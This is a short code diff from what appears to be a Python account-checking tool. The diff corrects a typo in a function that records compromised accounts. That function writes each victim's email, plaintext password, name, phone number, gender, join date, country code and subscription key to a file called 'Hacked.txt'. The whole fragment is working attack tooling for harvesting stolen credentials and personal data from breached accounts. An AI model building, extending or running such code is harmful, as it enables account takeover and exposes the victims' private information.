@@ -20,7 +20,7 @@ def saver(user,pess,rq):
     try:
         r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']
         with open('Hacked.txt', 'a') as x:
-            x.write(f'USR []\nEmail:[{user}]\nPassword:[{pess}]\nName:[{fnm} {lN}]\nPhone Number:[{phone}]\nJoin Date:[{jD}]\nender:[{gr}]\nLanguage:[{lc}]\nCountry Code:[{coc}]\nSubscription Key:[{sKey}]\n\n')
+            x.write(f'USR []\nEmail:[{user}]\nPassword:[{pess}]\nName:[{fnm} {lN}]\nPhone Number:[{phone}]\nJoin Date:[{jD}]\nGender:[{gr}]\nLanguage:[{lc}]\nCountry Code:[{coc}]\nSubscription Key:[{sKey}]\n\n')
     except Exception as i:
         with open('Hacked.txt', 'a') as x:
             x.write(f'USR []\nEmail:[{user}]\nPassword:[{pess}]\n')
